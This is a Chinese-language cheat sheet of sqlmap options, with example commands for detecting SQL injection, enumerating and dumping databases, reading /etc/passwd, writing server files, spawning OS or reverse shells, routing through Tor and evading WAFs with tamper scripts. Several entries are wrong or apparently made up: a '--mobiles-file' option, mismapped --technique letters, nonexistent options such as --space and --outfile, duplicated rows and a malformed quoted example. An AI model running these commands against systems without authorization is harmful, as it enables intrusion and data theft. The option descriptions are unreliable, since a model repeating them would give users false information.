`sqlmap` 是一个开源的自动化 SQL 注入和数据库接管工具，广泛用于渗透测试和安全评估。它支持多种数据库管理系统，并提供丰富的功能选项来检测和利用 SQL 注入漏洞。以下是 `sqlmap` 的所有常用参数的详细介绍，包括其用途和示例。

## 目录

1. [基本参数](#1-基本参数)
2. [目标定义参数](#2-目标定义参数)
3. [请求相关参数](#3-请求相关参数)
4. [注入技术参数](#4-注入技术参数)
5. [枚举数据库参数](#5-枚举数据库参数)
6. [数据库接管参数](#6-数据库接管参数)
7. [高级选项](#7-高级选项)
8. [示例](#8-示例)

* * *

## 1. 基本参数

这些参数用于定义基本的 sqlmap 行为，如帮助信息、版本信息等。

| 参数          | 描述                                  | 示例                    |
| ------------- | ------------------------------------- | ----------------------- |
| -h, --help    | 显示帮助信息并退出。                  | sqlmap -h               |
| --version     | 显示 sqlmap 版本并退出。              | sqlmap --version        |
| --wizard      | 通过交互式向导运行 sqlmap。           | sqlmap --wizard         |
| -v, --verbose | 设置详细输出级别（0-6）。默认值为 1。 | sqlmap -v 3 -u "URL"    |
| --batch       | 以批处理模式运行，跳过所有提示。      | sqlmap -u "URL" --batch |

* * *

## 2. 目标定义参数

这些参数用于定义和指定目标 URL 及其相关信息。

| 参数               | 描述                                      | 示例                           |
| ------------------ | ----------------------------------------- | ------------------------------ |
| -u, --url          | 指定目标 URL。                            | sqlmap -u "URL"                |
| -g, --google-dork  | 使用 Google Dork 搜索 URL。               | sqlmap -g "inurl:page.php?id=" |
| -m, --mobiles-file | 从文件中读取目标 URL，每行一个。          | sqlmap -m targets.txt          |
| --crawl            | 自动爬取网站并测试参数，深度范围 [1-10]。 | sqlmap --crawl=2 -u "URL"      |
| -l, --log          | 从日志文件中读取请求。                    | sqlmap -l requests.txt         |

* * *

## 3. 请求相关参数

这些参数用于定义 HTTP 请求的详细信息，如请求方法、头信息、数据等。

| 参数           | 描述                                | 示例                                                                     |
| -------------- | ----------------------------------- | ------------------------------------------------------------------------ |
| -p, --param    | 指定要测试的参数名称。              | sqlmap -u "URL" -p id                                                    |
| --data         | 定义 POST 数据。                    | sqlmap -u "URL" --data "username=admin&password=123"                     |
| --cookie       | 定义 HTTP Cookie。                  | sqlmap -u "URL" --cookie="PHPSESSID=abcd1234"                            |
| --headers      | 定义自定义 HTTP 头。                | sqlmap -u "URL" --headers="User-Agent: Mozilla/5.0"                      |
| --referer      | 设置 Referer 头。                   | sqlmap -u "URL" --referer="http://google.com"                            |
| --user-agent   | 设置 User-Agent 头。                | sqlmap -u "URL" --user-agent="Mozilla/5.0"                               |
| --proxy        | 通过代理服务器发送请求。            | sqlmap -u "URL" --proxy="http://127.0.0.1:8080"                          |
| --tor          | 通过 Tor 网络发送请求。             | sqlmap -u "URL" --tor                                                    |
| --tor-type     | 设置 Tor 类型（SOCKS5 或 SOCKS4）。 | sqlmap --tor --tor-type=SOCKS5                                           |
| --timeout      | 设置 HTTP 请求的超时时间（秒）。    | sqlmap -u "URL" --timeout=10                                             |
| --retries      | 设置重试次数。                      | sqlmap -u "URL" --retries=3                                              |
| --delay        | 在每个请求之间设置延迟（秒）。      | sqlmap -u "URL" --delay=2                                                |
| --random-agent | 使用随机的 User-Agent 头。          | sqlmap -u "URL" --random-agent                                           |
| --proxy-cred   | 设置代理服务器的认证信息。          | sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --proxy-cred="user:pass" |

* * *

## 4. 注入技术参数

这些参数用于指定 sqlmap 使用的 SQL 注入技术和策略。

| 参数         | 描述                                                                                             | 示例                                   |
| ------------ | ------------------------------------------------------------------------------------------------ | -------------------------------------- |
| --level      | 设置测试的级别（1-5）。级别越高，测试越深入。默认值为 1。                                        | sqlmap -u "URL" --level=3              |
| --risk       | 设置测试的风险级别（1-3）。级别越高，可能的破坏性越大。默认值为 1。                              | sqlmap -u "URL" --risk=2               |
| --technique  | 指定使用的 SQL 注入技术（B: 布尔盲注, E: 错误基注入, U: UNION 查询, T: 堆叠查询, Q: 时间盲注）。 | sqlmap -u "URL" --technique=BEUST      |
| --string     | 用于布尔盲注和基于错误的注入的识别字符串。                                                       | sqlmap -u "URL" --string="Welcome"     |
| --not-string | 指定不应出现的字符串。                                                                           | sqlmap -u "URL" --not-string="Error"   |
| --regexp     | 使用正则表达式匹配响应。                                                                         | sqlmap -u "URL" --regexp="Success"     |
| --suffix     | 在注入点后添加后缀。                                                                             | sqlmap -u "URL" --suffix="--"          |
| --prefix     | 在注入点前添加前缀。                                                                             | sqlmap -u "URL" --prefix="'"           |
| --tamper     | 使用 tamper 脚本对 payload 进行混淆。                                                            | sqlmap -u "URL" --tamper=space2comment |
| --time-sec   | 设置时间延迟盲注的等待时间（秒）。                                                               | sqlmap -u "URL" --time-sec=5           |

* * *

## 5. 枚举数据库参数

这些参数用于列举和获取数据库结构、表、列等信息。

| 参数         | 描述                                       | 示例                                                                   |
| ------------ | ------------------------------------------ | ---------------------------------------------------------------------- |
| --dbs        | 列出可用数据库。                           | sqlmap -u "URL" --dbs                                                  |
| -D, --db     | 指定数据库名称。                           | sqlmap -u "URL" -D databaseName --tables                               |
| -T, --table  | 指定表名称。                               | sqlmap -u "URL" -D databaseName -T tableName --columns                 |
| -C, --column | 指定列名称。                               | sqlmap -u "URL" -D databaseName -T tableName -C column1,column2 --dump |
| --tables     | 列出指定数据库中的所有表。                 | sqlmap -u "URL" -D databaseName --tables                               |
| --columns    | 列出指定表中的所有列。                     | sqlmap -u "URL" -D databaseName -T tableName --columns                 |
| --schema     | 获取数据库架构信息（包括表、列、外键等）。 | sqlmap -u "URL" --schema                                               |
| --count      | 获取查询结果的数量。                       | sqlmap -u "URL" --count                                                |
| --sql-query  | 执行自定义 SQL 查询。                      | sqlmap -u "URL" --sql-query="SELECT user, password FROM users"         |

* * *

## 6. 数据库接管参数

这些参数用于接管和控制数据库服务器。

| 参数          | 描述                                                    | 示例                                                                           |
| ------------- | ------------------------------------------------------- | ------------------------------------------------------------------------------ |
| --dump        | 转储数据库表的数据。                                    | sqlmap -u "URL" -D databaseName -T tableName --dump                            |
| --dump-all    | 转储所有可用数据库的数据。                              | sqlmap -u "URL" --dump-all                                                     |
| --dump-format | 指定转储数据的格式（如 CSV, SQL 等）。                  | sqlmap -u "URL" --dump --dump-format=CSV                                       |
| --threads     | 设置并发线程数以加快扫描速度。默认值为 1，最大值为 10。 | sqlmap -u "URL" --threads=5 --dump                                             |
| --outfile     | 将输出结果保存到指定文件。                              | sqlmap -u "URL" --dump --outfile=output.txt                                    |
| --file-read   | 从服务器读取指定文件。                                  | sqlmap -u "URL" --file-read="/etc/passwd"                                      |
| --file-write  | 向服务器写入文件。需要指定 --file-dest。                | sqlmap -u "URL" --file-write="localfile.txt" --file-dest="/tmp/remotefile.txt" |
| --file-dest   | 服务器上的文件写入路径。                                | sqlmap -u "URL" --file-write="localfile.txt" --file-dest="/tmp/remotefile.txt" |
| --os-shell    | 尝试获得操作系统 shell。                                | sqlmap -u "URL" --os-shell                                                     |
| --os-pwn      | 在目标系统上植入反向 shell。                            | sqlmap -u "URL" --os-pwn                                                       |
| --os-bof      | 在目标系统上执行缓冲区溢出攻击（需要合适的 exploit）。  | sqlmap -u "URL" --os-bof                                                       |

* * *

## 7. 高级选项

这些参数用于更细粒度地控制 sqlmap 的行为，包括日志记录、会话管理、输出格式等。

| 参数            | 描述                                             | 示例                                                                                 |
| --------------- | ------------------------------------------------ | ------------------------------------------------------------------------------------ |
| -o, --optimize  | 启用请求优化。                                   | sqlmap -u "URL" --optimize                                                           |
| --fresh-queries | 忽略缓存的请求，强制重新发送请求。               | sqlmap -u "URL" --fresh-queries                                                      |
| --delay         | 设置每个请求之间的延迟（秒）。                   | sqlmap -u "URL" --delay=3                                                            |
| --timeout       | 设置 HTTP 请求的超时时间（秒）。                 | sqlmap -u "URL" --timeout=15                                                         |
| --retries       | 设置请求重试次数。                               | sqlmap -u "URL" --retries=2                                                          |
| --ignore-code   | 忽略特定的 HTTP 状态码。                         | sqlmap -u "URL" --ignore-code=404                                                    |
| --level         | 设置测试的级别（1-5）。                          | sqlmap -u "URL" --level=4                                                            |
| --risk          | 设置风险级别（1-3）。                            | sqlmap -u "URL" --risk=3                                                             |
| --proxy         | 通过代理服务器发送请求。                         | sqlmap -u "URL" --proxy="http://127.0.0.1:8080"                                      |
| --tor           | 通过 Tor 网络发送请求。                          | sqlmap -u "URL" --tor                                                                |
| --check-tor     | 检查 Tor 是否在运行。                            | sqlmap --check-tor                                                                   |
| --csv-del       | 设置 CSV 文件的分隔符。                          | sqlmap -u "URL" --dump --dump-format=CSV --csv-del=";"                               |
| --space         | 设置分隔符，用于某些注入技术。                   | sqlmap -u "URL" --space=" "                                                          |
| --tor-port      | 设置 Tor 代理端口。                              | sqlmap -u "URL" --tor --tor-port=9050                                                |
| --tor-type      | 设置 Tor 类型（SOCKS5 或 SOCKS4）。              | sqlmap -u "URL" --tor --tor-type=SOCKS5                                              |
| --safe-url      | 设置一个安全的 URL，用于检查是否被 Tor IP 阻止。 | sqlmap -u "URL" --tor --safe-url="http://www.google.com" --safe-req="GET / HTTP/1.1" |
| --safe-req      | 设置一个安全的请求，用于访问 --safe-url。        | sqlmap -u "URL" --tor --safe-url="http://www.google.com" --safe-req="GET / HTTP/1.1" |
| --delay         | 在每个请求之间设置延迟（秒）。                   | sqlmap -u "URL" --delay=2                                                            |
| --timeout       | 设置 HTTP 请求的超时时间（秒）。                 | sqlmap -u "URL" --timeout=10                                                         |

* * *

## 8. 示例

以下是一些常见的 sqlmap 使用场景及其相应的命令示例。

### 列出目标数据库服务器上所有可用的数据库

```bash
sqlmap -u "URL" --dbs
```

### 指定参数进行 SQL 注入测试

```bash
sqlmap -u "URL&cat=books" -p id --dbs
```

### 使用 POST 数据进行 SQL 注入测试

```bash
sqlmap -u "http://example.com/login.php" --data "username=admin&password=123" --dbs
```

### 使用代理服务器进行测试

```bash
sqlmap -u "URL" --proxy="http://127.0.0.1:8080" --dbs
```

### 列出指定数据库中的所有表

```bash
sqlmap -u "URL" -D "databaseName" --tables
```

### 列出指定表中的所有列。

```bash
sqlmap -u "URL" -D "databaseName" -T "tableName" --columns
```

### 导出指定表的数据
```bash
sqlmap -u "URL" -D "databaseName' -T "tableName" --dump
```

### 转储数据库表的数据

```bash
sqlmap -u "URL" -D "databaseName" -T "tableName" --dump
```

### 通过 Tor 网络进行匿名测试

```bash
sqlmap -u "URL" --tor --tor-type=SOCKS5 --check-tor --dbs
```

### 使用自定义 HTTP 头进行测试

```bash
sqlmap -u "URL" --headers="X-Forwarded-For: 127.0.0.1" --dbs
```

### 批处理模式运行

```bash
sqlmap -u "URL" --dbs --batch
```

### 使用 Tamper 脚本绕过 WAF

```bash
sqlmap -u "URL" --dbs --tamper=space2comment
```

* * *